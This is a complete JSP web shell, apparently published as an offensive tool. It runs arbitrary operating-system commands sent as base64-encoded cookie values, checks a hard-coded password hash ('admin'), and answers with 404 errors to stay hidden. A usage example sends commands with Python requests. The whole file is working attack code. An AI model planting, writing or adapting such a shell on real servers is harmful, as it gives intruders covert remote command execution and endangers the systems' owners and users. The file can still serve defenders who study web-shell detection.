<%--
A simple JSP cmd shell.
By Ahmed Shawky @lnxg33k

Why ?
1. Beacsue it is fun.
2. The payload/command is being sent as a b64 cookie value.
3. Protected with a sha1 hash 'not session based but this is life ;)'
4. A bit tricky 'the 404 thingy down there'.

Example:
>>> from requests import request
>>> print request("GET", "http://localhost:8080/test.jsp", cookies={'d5b8022688': 'admin', '31bfe69acf': 'ls'.encode('base64').replace("=", "").replace('\n', '')}).content
--%>
<%@page import="java.math.BigInteger"%>
<%@page import="java.security.MessageDigest"%>
<%@page import="java.util.*,java.io.*"%>
<%
    try {
        String hash = "d033e22ae348aeb5660fc2140aec35850c4da997";	//admin

        String password = null;						//d5b8022688
        String command = null;						//31bfe69acf
        Cookie cookie = null;
        Cookie[] cookies = null;

        cookies = request.getCookies();
        if (cookies != null) {
            for (int i = 0; i < cookies.length; i++) {
                cookie = cookies[i];
                if (cookie.getName().equals("d5b8022688")) {
                    password = cookie.getValue();
                } else if (cookie.getName().equals("31bfe69acf")) {
                    command = cookie.getValue();
                    byte[] decoded = Base64.getDecoder().decode(command);
                    command = new String(decoded);
                }
            }
        }

        MessageDigest mdEnc = MessageDigest.getInstance("SHA-1");
        mdEnc.update(password.getBytes(), 0, password.length());
        String output = new BigInteger(1, mdEnc.digest()).toString(16);

        if (hash.equals(output)) {
            Process p = Runtime.getRuntime().exec(new String(command));
            InputStream in = p.getInputStream();
            BufferedReader dis = new BufferedReader(new InputStreamReader(in));
            String disr = dis.readLine();
            while (disr != null) {
                out.println(disr);
                disr = dis.readLine();
            }
        } else {
            response.sendError(404);
        }
    } catch (Exception e) {
        response.sendError(404);
    }
%>
